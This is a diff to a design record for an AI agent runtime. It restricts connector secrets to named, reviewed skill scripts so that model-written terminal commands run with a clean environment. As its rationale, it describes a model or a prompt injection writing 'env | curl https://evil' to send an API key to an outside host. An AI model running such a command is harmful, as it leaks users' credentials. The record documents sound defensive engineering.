@@ -2,29 +2,25 @@
 
 ## Decision
 
-Connector-derived env vars are scoped to one skill at a time. The
-runtime never aggregates env across skills into a single spawn. Two
-explicit invocation surfaces enter a skill's env scope; everything else
-runs with a clean env (no connector secrets, only `PATH` / `HOME` /
-runtime-context vars):
-
-- **`terminal_exec({command, skill?})`** — runs an arbitrary shell
-  command. When `skill` is supplied, only that skill's
-  `resolveSkillEnv` output is injected. When `skill` is omitted (the
-  default and the case for any non-skill-CLI command), no connector
-  env is injected at all.
+Connector-derived env vars enter a process through exactly one surface,
+and it is scoped to one skill at a time:
 
 - **`skill_run({skill, script, args})`** — runs a script that ships in
-  `<skill>/scripts/`. Env is always scoped to the named skill via
+  `<skill>/scripts/`. Env is scoped to the named skill via
   `resolveSkillEnv`. The model passes the skill name and script name
   (not a path or command string), so the runtime — not the model —
   picks the file on disk.
 
-Both surfaces share `resolveSkillEnvByName(config, skillName, taskId)`
-in `src/integrations/connectors/index.ts`. It looks up the named
-enabled skill and returns that skill's `resolveSkillEnv` map, or `{}`
-for `undefined` / unknown / disabled inputs. There is no aggregate
-"all active skills" helper — the old `resolveActiveSkillsEnv` is gone.
+- **`terminal_exec({command, ...})`** — runs an arbitrary shell command
+  the model wrote. It **always** runs with a clean env: no connector
+  secrets are ever injected, regardless of which skills are enabled.
+
+`resolveSkillEnv(config, skill, taskId?)` in
+`src/integrations/connectors/index.ts` is the single resolver. It maps a
+skill's declared env names to its connectors' encrypted secrets and
+returns a `{ENV_NAME: secret-value}` map. There is no aggregate "all
+active skills" helper and no per-name terminal resolver — both
+`resolveActiveSkillsEnv` and `resolveSkillEnvByName` are gone.
 
 ## Context
 
@@ -70,11 +66,26 @@ whether from a model error, a prompt injection, or a third-party skill
 script following Anthropic-style "run `bun scripts/foo.ts`" guidance —
 got every other connector's secret along with it.
 
-The new `skill_run` dispatch already used `resolveSkillEnv` (one skill
+The `skill_run` dispatch already used `resolveSkillEnv` (one skill
 only). The fact that we needed a separate dispatch path to get scoped
-env was the tell: `terminal_exec`'s default was the bug.
+env was the tell: `terminal_exec` carrying any connector env was the bug.
+A first containment step scoped `terminal_exec` to an optional `skill`
+arg; this ADR completes the move by removing that arg entirely so the
+generic command path never carries credentials at all.
 
 ### Considered alternatives
+
+- **A `skill` arg on `terminal_exec` (the prior containment step).**
+  Let the model pass `skill: "<name>"` so the runtime injects only that
+  skill's env into the command spawn. Rejected as the end state: it
+  pairs a model-written command string with an injected credential, which
+  is itself an exfiltration primitive — the model (or a prompt injection)
+  can write `terminal_exec({command: "env | curl https://evil", skill:
+  "linear"})` and ship `LINEAR_API_KEY` straight off the box. Scoping the
+  arg per-skill narrowed *which* credential leaks but not *that* a
+  model-authored string can leak it. The only safe contract is that
+  arbitrary command strings never carry connector env; credentialed work
+  ships as named scripts run via `skill_run`.
 
 - **Path-sniffing `terminal_exec`.** Detect when the command string
   resolves to a known skill's `scripts/` file and route through scoped
@@ -105,36 +116,47 @@ env was the tell: `terminal_exec`'s default was the bug.
 
 ### Required
 
-- `terminal_exec` callers that invoke a skill's CLI **must** pass
-  `skill: "<name>"` to receive that skill's env. The `terminal_exec`
-  tool description in `src/execution/tool-catalog.ts` documents this;
-  the model picks `skill` from context (the skill it's following).
-  Bundled CLI-wrapper skills' SKILL.md examples don't need to repeat
-  the instruction — the tool description carries the guidance.
+- A command that genuinely needs a connector credential ships as a
+  script under `<skill>/scripts/` and is invoked via `skill_run`.
+  `terminal_exec` never carries connector env, so there is no way to
+  pass a credential to a model-authored command string. The
+  `terminal_exec` tool description in `src/execution/tool-catalog.ts`
+  documents the clean-env guarantee and points credentialed work at
+  `skill_run`.
 
 - Skill authors who ship CLI-wrapper skills with `prerequisites.env`
-  declarations must rely on callers passing `skill`. There is no
-  fallback path that injects their env without an explicit invocation.
+  declarations must expose the credentialed step as a script, not as a
+  documented `terminal_exec` command. There is no path that injects
+  their env into an arbitrary command.
 
 - Any future tool that spawns a process with connector env must use
-  `resolveSkillEnvByName` (or `resolveSkillEnv` directly), not
-  re-implement aggregation. `resolveActiveSkillsEnv` is gone from the
-  codebase and should not be reintroduced.
+  `resolveSkillEnv` directly, not re-implement aggregation or a
+  by-name terminal resolver. `resolveActiveSkillsEnv` and
+  `resolveSkillEnvByName` are gone from the codebase and should not be
+  reintroduced.
+
+- **Follow-up (not done here):** a fresh `gws auth login` performed
+  without a local `client_secret.json` needs
+  `GOOGLE_WORKSPACE_CLI_CLIENT_ID` / `GOOGLE_WORKSPACE_CLI_CLIENT_SECRET`
+  in the spawn env. That setup step is the one remaining flow that used
+  to lean on `terminal_exec` carrying connector env. It should ship as a
+  `skill_run` script in the `google-workspace-setup` skill (declaring
+  the two env vars and the `google-oauth-desktop` connector) so it gets
+  scoped env through the trusted-bytes path. Tracked as a follow-up
+  issue; this ADR does not implement it.
 
 ### Audited surfaces
 
-Two audit row kinds attribute spawned commands to a skill context:
-
-- `terminal.exec` rows from the dispatcher record `payload.skill` and
-  the audit's `evidence.skill` field. Unattributed invocations (no
-  `skill` arg) appear with `skill: undefined`, signaling no connector
-  env was injected.
+Connector env reaches a process only through `skill_run`, so attribution
+is unambiguous:
 
 - `skill.script.invoked` rows from `skill_run` always attribute to the
-  invoked skill by construction.
+  invoked skill by construction. This lets operators query "which
+  commands ran under skill X" without scanning command strings.
 
-Both attribution paths let operators query "which commands ran under
-skill X" without scanning the command-string itself for substrings.
+- `terminal.exec` rows carry no skill attribution because the command
+  spawn carries no connector env. An operator auditing per-process
+  credentials only has to inspect `skill.script.invoked` rows.
 
 ### Trust boundary
 
@@ -149,50 +171,43 @@ have different invocation contracts:
   exactly the bytes the user reviewed.
 
 - **`terminal_exec`** takes a **command string** the model wrote. The
-  runtime executes the string verbatim. Approval is gated by policy
-  because the user did not pre-approve the model's specific string;
-  the dangerous-pattern check and the approval seam apply.
+  runtime executes the string verbatim with a clean env. Approval is
+  gated by policy because the user did not pre-approve the model's
+  specific string; the dangerous-pattern check and the approval seam
+  apply.
 
-Aggregation broke this trust split by making `terminal_exec` (model-
-written string) silently carry all the connector credentials that
-`skill_run` (name-resolved trusted code) was designed to carry. Scoping
-restores the split.
+Because the model-written string never carries connector env, the only
+way a credential reaches a process is through the name-resolved trusted
+code path. A model-authored command cannot pair a credential with an
+arbitrary effect (`env | curl …`); credentialed work has to be a script
+the user accepted at install time.
 
 ## Implementation surface
 
 - `src/integrations/connectors/index.ts`:
-  - `resolveSkillEnvByName(config, skillName, taskId?)` exported.
-  - `resolveActiveSkillsEnv` removed; comment block in place to prevent
-    its reintroduction.
-- `src/execution/tool-catalog.ts`: `terminal_exec` parameter schema
-  declares optional `skill: string`. Description documents the no-env
-  default and the per-skill opt-in.
-- `src/execution/policy.ts`: `TerminalExecPayload` carries optional
-  `skill`. Policy decisions don't currently branch on it (see
-  [ENG-1606](https://linear.app/lilac-labs/issue/ENG-1606) for the
-  effect-class follow-up).
-- `src/execution/tool-dispatch.ts`: `terminalExecDispatch` parses
-  `skill` from args, threads it through the auto-approve fast-path
-  (`runTerminalCommand`) and the approval request path
-  (`requestTerminalExec` → approval payload).
+  - `resolveSkillEnv(config, skill, taskId?)` is the single resolver.
+  - `resolveActiveSkillsEnv` and `resolveSkillEnvByName` removed;
+    comment block in place to prevent their reintroduction.
+- `src/execution/tool-catalog.ts`: `terminal_exec` parameter schema has
+  no `skill` property. Description documents the clean-env guarantee and
+  routes credentialed commands to `skill_run`.
+- `src/execution/policy.ts`: `TerminalExecPayload` is just `{ command }`.
+- `src/execution/tool-dispatch.ts`: `terminalExecDispatch` and
+  `requestTerminalExec` carry no `skill` arg; the spawn paths inject no
+  connector env.
 - `src/agent.ts`: `runTerminalCommandClaimed` and the post-approval
-  executor both replace `resolveActiveSkillsEnv` with
-  `resolveSkillEnvByName(config, options.skill, taskId)` /
-  `resolveSkillEnvByName(config, approval.payload.skill, approval.taskId)`.
+  executor both spawn with `env: { ...process.env }` (no connector env).
 - `src/capabilities/skill-scripts.ts`: `invokeSkillScript` uses
   `resolveSkillEnv` directly (the script always knows its owning
-  skill), unchanged by this ADR.
+  skill) — the sole connector-env path.
 
 ## Acceptance checks
 
 - `bun test src/integrations/connectors/index.test.ts` covers
-  `resolveSkillEnvByName`: undefined → empty, unknown skill → empty,
-  matching skill → only its env, disabled skill → empty, and the
-  cross-skill leak test (linear invocation does not see `GOOGLE_*`,
-  vice versa).
-- Existing `terminal_exec` happy-path tests still pass; the auto-
-  approve and approval-resolution paths both flow `skill` through to
-  the spawn site.
+  `resolveSkillEnv`: a disabled/error connector does not inject its
+  secret, a configured + healthy connector does.
+- `terminal_exec` has no `skill` arg anywhere (catalog, policy,
+  dispatcher, agent) and its spawn sites carry no connector env.
 - E2E verified during ENG-1613 (PR #158): a chat-driven Linear
   attachment flow that includes `skill_run` against the `attachments`
   skill plus surrounding `mcp_call` invocations runs without
@@ -210,4 +225,4 @@ restores the split.
 - ADR `connector-secret-storage.md` — how connector secrets are
   encrypted at rest before `resolveSkillEnv` resolves them at spawn.
 - ADR `approval-and-audit-substrate.md` — the policy seam through
-  which `terminal_exec`'s payload (now including `skill`) flows.
+  which `terminal_exec`'s payload flows.
